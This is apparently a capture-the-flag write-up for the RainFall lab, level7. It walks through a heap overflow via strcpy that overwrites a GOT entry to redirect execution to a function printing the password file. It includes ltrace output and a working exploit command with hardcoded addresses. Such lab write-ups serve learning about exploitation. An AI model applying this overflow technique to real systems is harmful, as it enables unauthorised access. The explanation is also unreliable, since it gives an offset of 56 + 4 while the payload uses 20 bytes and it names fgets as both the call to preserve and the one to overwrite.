This time we have a binary that makes a bunch of malloc calls in the main function, as well as a fopen on the pass file.

There is a fgets call to load the contents of the file but there doesn't seem to be a way to print it.

There is a puts call right after, we might swap the pointer in it or we might try and call m that does print the pointer after fgets has been done

Strcpy is used, this will be our entrypoint.

The first strcpy can be used to overflow the heap and change the value stored for the second strcpy

```
level7@RainFall:~$ ltrace ./level7 aaaaaaaaaaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbbbbbbbbbbbb
__libc_start_main(0x8048521, 3, 0xbffff7b4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                                               = 0x0804a008
malloc(8)                                                                                               = 0x0804a018
malloc(8)                                                                                               = 0x0804a028
malloc(8)                                                                                               = 0x0804a038
strcpy(0x0804a018, "aaaaaaaaaaaaaaaaaaaaaaaa")                                                          = 0x0804a018
strcpy(0x61616161, "bbbbbbbbbbbbbbbbbbbbbbbbbbbbb" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Our offset will be 56 + 4, now we can copy something to a destination in memory.
Since we need the fgets to work properly, that only leaves fgets which address is 0x08049928
and we need to pass the m address at 0x080484f4

```
level7@RainFall:~$ ./level7 $(python -c 'print("A"*20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
```
